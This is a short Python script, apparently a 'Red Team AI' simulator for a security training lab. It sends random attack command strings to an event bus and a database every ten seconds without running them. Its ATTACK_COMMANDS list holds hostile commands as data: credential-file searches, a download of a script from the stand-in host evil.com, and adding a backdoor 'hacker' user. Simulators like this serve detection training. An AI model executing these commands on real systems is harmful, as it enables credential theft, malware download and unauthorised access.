import sys
import time
import random
from datetime import datetime
import os

sys.path.append('/app/shared')
from messaging import EventBus
from database import Database

# 攻撃パターン
ATTACK_COMMANDS = [
    "powershell.exe Get-ChildItem C:\\ -Recurse -Filter *.pdf",
    "cmd.exe /c dir C:\\Users /s /b | findstr password",
    "powershell.exe Invoke-WebRequest http://evil.com/steal.ps1",
    "net user hacker P@ssw0rd /add",
    "powershell.exe Get-Process | Where-Object {$_.CPU -gt 100}",
]

def main():
    print("🔴 Red Team AI Starting...")
    
    # Redis接続
    redis_url = os.getenv('REDIS_URL', 'redis://redis:6379')
    event_bus = EventBus(redis_url)
    
    # データベース接続
    db_url = os.getenv('DB_URL', 'postgresql://user:password@timescaledb:5432/sechack')
    db = Database(db_url)
    
    attack_number = 1
    
    while True:
        command = random.choice(ATTACK_COMMANDS)
        
        attack = {
            'id': attack_number,
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'user': 'Student_A',
        }
        
        # Redisに送信
        event_bus.send_attack(attack)
        
        # データベースに保存
        try:
            db.save_attack(attack)
            print(f"💾 Saved to database: Attack #{attack_number}")
        except Exception as e:
            print(f"⚠️ DB Error: {e}")
        
        attack_number += 1
        time.sleep(10)

if __name__ == '__main__':
    main()